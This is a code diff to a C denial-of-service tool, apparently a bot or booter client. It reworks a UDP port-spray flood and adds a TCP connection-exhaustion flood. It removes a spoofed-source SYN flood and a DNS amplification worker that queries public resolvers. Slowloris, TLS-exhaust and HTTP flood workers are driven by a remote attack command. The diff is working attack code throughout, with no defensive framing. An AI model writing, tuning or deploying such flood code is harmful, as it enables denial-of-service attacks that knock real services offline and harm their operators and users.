@@ -96,20 +96,19 @@ typedef struct {
     int port_base; int duration; int cpu_id; char host[256];
 } MegaThread;
 
-#define MEGA_W_BATCH 65535   /* full power — matches base fjium-pps.c */
-#define MEGA_W_BURST 64      /* matches base BURST_MULTIPLIER */
+#define UDP_DESTS 1024    /* UIO_MAXIOV limit: 1 sendmmsg = 1024 unique ports */
+#define UDP_BURST 64      /* 64 sendmmsg per socket per iteration */
 
-static void *mega_worker(void *arg) {
+static void *udp_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
-    /* MEGA: full power — WS thread is SCHED_FIFO(99) so it always preempts */
-    /* 65535 dest addresses: one PER DATAGRAM → all ports hit simultaneously */
-    size_t m_sz = sizeof(struct mmsghdr) * MEGA_W_BATCH;
-    size_t v_sz = sizeof(struct iovec) * MEGA_W_BATCH;
-    size_t d_sz = sizeof(struct sockaddr_in) * MEGA_W_BATCH; /* 65535 × 16 ≈ 1MB */
+    /* MEGA: 1024-batch (kernel UIO_MAXIOV limit), dynamic port spray all 65535 */
+    size_t m_sz = sizeof(struct mmsghdr) * UDP_DESTS;
+    size_t v_sz = sizeof(struct iovec) * UDP_DESTS;
+    size_t d_sz = sizeof(struct sockaddr_in) * UDP_DESTS;
     struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     struct iovec *iovs = mmap(NULL, v_sz, PROT_READ | PROT_WRITE,
@@ -123,17 +122,11 @@ static void *mega_worker(void *arg) {
         return NULL;
     }
 
-    /* Pre-fill dest addresses: each datagram gets UNIQUE port (1-65535) */
-    for (int i = 0; i < MEGA_W_BATCH; i++) {
+    /* Pre-fill fixed fields; ports randomized per iteration below */
+    for (int i = 0; i < UDP_DESTS; i++) {
         dests[i].sin_family = AF_INET;
         dests[i].sin_addr = mt->target.sin_addr;
-        uint16_t port = (uint16_t)((i % 65535) + 1);
-        /* 25% of datagrams hit the base port (focused damage) */
-        if ((i & 3) == 0) port = (uint16_t)mt->port_base;
-        if (port == 0) port = 1;
-        dests[i].sin_port = htons(port);
-
-        iovs[i].iov_base = &dests[i]; /* any valid ptr, iov_len=0 so data unused */
+        iovs[i].iov_base = &dests[i]; /* valid ptr, iov_len=0 → zero-byte UDP */
         iovs[i].iov_len = 0;
         msgs[i].msg_hdr.msg_iov = &iovs[i];
         msgs[i].msg_hdr.msg_iovlen = 1;
@@ -156,11 +149,22 @@ static void *mega_worker(void *arg) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
 
+        /* Randomize all dest ports: 25% target port, 75% random 1-65535 */
+        for (int i = 0; i < UDP_DESTS; i++) {
+            uint16_t p = (uint16_t)((rand() % 65535) + 1);
+            if ((i & 3) == 0) p = (uint16_t)mt->port_base;
+            if (p == 0) p = 1;
+            dests[i].sin_port = htons(p);
+        }
+
         for (int s = 0; s < mt->sock_count && !is_attack_stop(); s++) {
-            for (int b = 0; b < MEGA_W_BURST && !is_attack_stop(); b++) {
-                int r = safe_sendmmsg(mt->socks[s], msgs, MEGA_W_BATCH, flags);
+            for (int b = 0; b < UDP_BURST && !is_attack_stop(); b++) {
+                int r = safe_sendmmsg(mt->socks[s], msgs, UDP_DESTS, flags);
                 if (r > 0) pkt_sent(r);
-                else if (errno == EAGAIN || errno == EWOULDBLOCK) { usleep(1); break; }
+                else if (r < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                    /* Hard error — socket dead, msgvec invalid, or kernel limit */
+                    usleep(1000); break;
+                } else { usleep(1); break; }
             }
 #ifdef MSG_ZEROCOPY
             if ((++zc & 0x7) == 0) {
@@ -181,79 +185,64 @@ static void *mega_worker(void *arg) {
     return NULL;
 }
 
-/* SYN Flood (fixed: TCP options, real src IP, no spoofing) */
-static void *syn_worker(void *arg) {
+/* MEGA — TCP Connection Flood: exhausts target's FDs/TCP stack (bandwidth-light) */
+#define MEGA_TCP_POOL 4096
+static void *mega_tcp_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
-    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (s < 0) return NULL;
-    int one = 1;
-    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-
-    struct {
-        struct iphdr ip;
-        struct tcphdr tcp;
-        unsigned char opts[20];
-    } pkt;
-    memset(&pkt, 0, sizeof(pkt));
-
-    /* IP header */
-    pkt.ip.version = 4; pkt.ip.ihl = 5;
-    pkt.ip.ttl = 64; pkt.ip.protocol = IPPROTO_TCP;
-    pkt.ip.daddr = mt->target.sin_addr.s_addr;
-    pkt.ip.tot_len = htons(sizeof(pkt));
-
-    /* TCP header with options */
-    pkt.tcp.dest = htons((uint16_t)mt->port_base);
-    pkt.tcp.syn = 1;
-    unsigned char *opt = pkt.opts;
-    *opt++ = 2; *opt++ = 4; *(uint16_t *)opt = htons(1460); opt += 2; /* MSS */
-    *opt++ = 4; *opt++ = 2;                                              /* SACK */
-    *opt++ = 1; *opt++ = 0;                                              /* NOP padding */
-    int optlen = (int)(opt - pkt.opts);
-    pkt.tcp.doff = 5 + (optlen + 3) / 4;
-    pkt.tcp.window = htons(65535);
-
-    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
     time_t start = time(NULL);
+    int *socks = calloc(MEGA_TCP_POOL, sizeof(int));
+    if (!socks) return NULL;
+
+    struct sockaddr_in ta = mt->target;
+    int pool = 0;
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
-        pkt.ip.saddr = rand_vn_ip();
-        pkt.tcp.source = htons((uint16_t)(1024 + rand_r(&seed) % 64511));
-        pkt.tcp.seq = htonl(rand_r(&seed));
-        pkt.ip.id = htons((uint16_t)rand_r(&seed));
-        pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
-        pkt.tcp.check = 0;
-        pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
-        struct sockaddr_in sin = mt->target;
-        if (sendto(s, &pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + optlen, MSG_DONTWAIT,
-                   (struct sockaddr *)&sin, sizeof(sin)) > 0)
+
+        /* Fill pool */
+        while (pool < MEGA_TCP_POOL && !is_attack_stop()) {
+            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s < 0) break;
+            int fl = 1;
+            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
+            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &fl, sizeof(fl));
+            if (tcp_connect_wait(s, &ta, 500) < 0) { close(s); continue; }
+            socks[pool++] = s;
             pkt_sent(64);
-        /* 10K pps burst per worker */
-        for (int b = 0; b < 100 && !is_attack_stop(); b++) {
-            pkt.tcp.source = htons((uint16_t)(1024 + rand_r(&seed) % 64511));
-            pkt.tcp.seq = htonl(rand_r(&seed));
-            pkt.ip.id = htons((uint16_t)rand_r(&seed));
-            pkt.ip.saddr = rand_vn_ip();
-            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
-            pkt.tcp.check = 0;
-            pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
-            struct sockaddr_in bsin = mt->target;
-            if (sendto(s, &pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + optlen, MSG_DONTWAIT,
-                       (struct sockaddr *)&bsin, sizeof(bsin)) > 0)
-                pkt_sent(64);
         }
+
+        /* Reap dead connections */
+        struct pollfd fds[MEGA_TCP_POOL];
+        int nfds = (pool < (int)(sizeof(fds)/sizeof(fds[0]))) ? pool : (int)(sizeof(fds)/sizeof(fds[0]));
+        for (int i = 0; i < nfds; i++) {
+            fds[i].fd = socks[i];
+            fds[i].events = POLLERR | POLLHUP;
+        }
+        if (poll(fds, nfds, 200) > 0) {
+            int w = 0;
+            for (int i = 0; i < pool; i++) {
+                if (i < nfds && (fds[i].revents & (POLLERR | POLLHUP)))
+                    close(socks[i]);
+                else {
+                    if (w != i) socks[w] = socks[i];
+                    w++;
+                }
+            }
+            pool = w;
+        }
+        sched_yield();
     }
-    close(s);
+    for (int i = 0; i < pool; i++) close(socks[i]);
+    free(socks);
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ TLS Exhaust (fixed: poll-based connect, full handshake, 2000+ pool) Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* TLS Exhaust (pool-based TCP+TLS connect, holds connections) */
 #define TLS_POOL 2048
 static void *tls_exhaust_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
@@ -515,94 +504,14 @@ static void *slowloris_worker(void *arg) {
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ DNS Amplification (fixed: TXT/MX queries, no spoofing, real protocol) Ã¢â€â‚¬Ã¢â€â‚¬ */
-#define DNS_POOL 64
-static void *dns_worker(void *arg) {
-    MegaThread *mt = (MegaThread *)arg;
-    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
-    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
-    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
-
-    time_t start = time(NULL);
-    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
-    int *socks = calloc(DNS_POOL, sizeof(int));
-    if (!socks) return NULL;
-    for (int i = 0; i < DNS_POOL; i++) {
-        int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-        socks[i] = (s >= 0) ? s : -1;
-    }
-
-    /* Open DNS resolvers */
-    const char *resolvers[] = {
-        "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9", "208.67.222.222",
-        "64.6.64.6", "185.228.168.9", "76.76.2.0"
-    };
-    const int nres = 8;
-
-    /* Build DNS query with EDNS0 for large responses */
-    unsigned char q[512];
-    unsigned short txid = 0;
-
-    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
-        int us = should_throttle();
-        if (us > 0) { usleep((unsigned)us); continue; }
-        for (int ri = 0; ri < nres && !is_attack_stop(); ri++) {
-            struct sockaddr_in res_sa;
-            memset(&res_sa, 0, sizeof(res_sa));
-            res_sa.sin_family = AF_INET;
-            res_sa.sin_port = htons(53);
-            inet_pton(AF_INET, resolvers[ri], &res_sa.sin_addr);
-
-            for (int ti = 0; ti < 4 && !is_attack_stop(); ti++) {
-                txid = (unsigned short)(rand_r(&seed) & 0xFFFF);
-                int off = 0;
-                /* DNS header */
-                q[off++] = (unsigned char)(txid >> 8);
-                q[off++] = (unsigned char)(txid & 0xFF);
-                q[off++] = 0x01; q[off++] = 0x00; /* RD */
-                q[off++] = 0x00; q[off++] = 0x01; /* QDCOUNT=1 */
-                q[off++] = 0x00; q[off++] = 0x00; /* ANCOUNT=0 */
-                q[off++] = 0x00; q[off++] = 0x00; /* NSCOUNT=0 */
-                q[off++] = 0x00; q[off++] = 0x01; /* ARCOUNT=1 (EDNS) */
-                /* Query section */
-                q[off++] = 3; memcpy(q + off, "com", 3); off += 3;
-                q[off++] = (unsigned char)(rand_r(&seed) & 0xFF);
-                q[off++] = 0x00;
-                q[off++] = 0x00; q[off++] = (ti % 2 == 0) ? 16 : 15; /* TXT or MX */
-                q[off++] = 0x00; q[off++] = 0x01; /* IN */
-                /* EDNS0 OPT */
-                q[off++] = 0x00; /* NAME=root */
-                q[off++] = 0x00; q[off++] = 41; /* TYPE=OPT */
-                q[off++] = 0x10; q[off++] = 0x00; /* UDP=4096 */
-                q[off++] = 0x00; q[off++] = 0x00; q[off++] = 0x00; q[off++] = 0x00; /* RCODE, EDNS version, flags */
-                q[off++] = 0x00; q[off++] = 0x00; /* RDLENGTH=0 */
-
-                int si = rand_r(&seed) % DNS_POOL;
-                if (socks[si] >= 0) {
-                    if (sendto(socks[si], q, off, MSG_DONTWAIT, (struct sockaddr *)&res_sa, sizeof(res_sa)) > 0)
-                        pkt_sent(off);
-                }
-            }
-        }
-        usleep(10000);
-    }
-    for (int i = 0; i < DNS_POOL; i++) if (socks[i] >= 0) close(socks[i]);
-    free(socks);
-    return NULL;
-}
-
-static uint16_t icmp_csum(void *d, size_t l) { return ip_csum(d, l); }
-
-/* Ã¢â€â‚¬Ã¢â€â‚¬ Background Attack Thread Dispatcher Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */
 static void *dispatch_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     switch (mt->cpu_id) {
-    case -1: return dns_worker(arg);
     case -2: return slowloris_worker(arg);
     case -3: return http_worker(arg);
     case -4: return tls_exhaust_worker(arg);
-    case -5: return syn_worker(arg);
-    default: return mega_worker(arg);
+    case -6: return mega_tcp_worker(arg);
+    default: return udp_worker(arg);
     }
 }
 
@@ -629,26 +538,23 @@ void *bg_attack_thread(void *arg)
         for (const char *p = method; *p && j < 31; p++)
             nm[j++] = (char)((*p >= 'a' && *p <= 'z') ? *p - 32 : *p);
     }
-    int mega = atk->mega_mode || !strcmp(nm, "MEGA") || !strcmp(nm, "UDP");
-    int is_syn    = !strcmp(nm, "SYN");
-    int is_tls    = atk->tls_exhaust || !strcmp(nm, "TLS_EXHAUST") || !strcmp(nm, "TLS");
-    int is_http   = !strcmp(nm, "HTTP");
-    int is_slow   = atk->slowloris || !strcmp(nm, "SLOWLORIS");
-    int is_dns    = atk->dns_amp || !strcmp(nm, "DNS_AMP");
-    int is_udp = !strcmp(nm, "UDP") || !strcmp(nm, "MEGA");
-    if (!is_syn && !is_tls && !is_http && !is_slow && !is_dns && !is_udp) {
-        fprintf(stderr, "[atk] unknown method, abort\n");
+    int is_mega  = atk->mega_mode || !strcmp(nm, "MEGA");
+    int is_udp   = !strcmp(nm, "UDP");
+    int is_tls   = atk->tls_exhaust || !strcmp(nm, "TLS_EXHAUST") || !strcmp(nm, "TLS");
+    int is_http  = !strcmp(nm, "HTTP");
+    int is_slow  = atk->slowloris || !strcmp(nm, "SLOWLORIS");
+    if (!is_mega && !is_udp && !is_tls && !is_http && !is_slow) {
+        fprintf(stderr, "[atk] unknown method '%s', abort\n", nm);
         set_attack_active(0);
         free(ctx);
         return NULL;
     }
-    if (is_udp) mega = 1;
 
     int cores = get_nprocs();
     if (cores < 1) cores = 1;
 
-    /* MEGA / UDP: existing high-throughput engine */
-    if (mega) {
+    /* UDP: explicit socket pool + udp_worker dispatch */
+    if (is_udp) {
         struct sysinfo si;
         long free_mb = 512;
         if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
@@ -710,7 +616,7 @@ void *bg_attack_thread(void *arg)
             set_attack_active(0); free(ctx); return NULL;
         }
 
-        fprintf(stderr, "[atk] MEGA UDP target=%s:%d dur=%ds socks=%d workers=%d\n",
+        fprintf(stderr, "[atk] UDP target=%s:%d dur=%ds socks=%d workers=%d\n",
                 atk->target, atk->port, atk->duration_secs, sock_cnt, threads);
 
         pthread_attr_t attr;
@@ -758,11 +664,11 @@ void *bg_attack_thread(void *arg)
 
         int tag;
         const char *label;
-        if (is_syn)  { tag = -5; label = "SYN"; }
-        else if (is_tls)  { tag = -4; label = "TLS_EXHAUST"; }
+        if (is_tls)     { tag = -4; label = "TLS_EXHAUST"; }
         else if (is_http) { tag = -3; label = "HTTP"; }
         else if (is_slow) { tag = -2; label = "SLOWLORIS"; }
-        else              { tag = -1; label = "DNS_AMP"; }
+        else if (is_mega) { tag = -6; label = "MEGA TCP"; }
+        else              { tag = 0;  label = "UDP"; }
 
         fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d\n",
                 label, atk->target, atk->port, atk->duration_secs, threads);
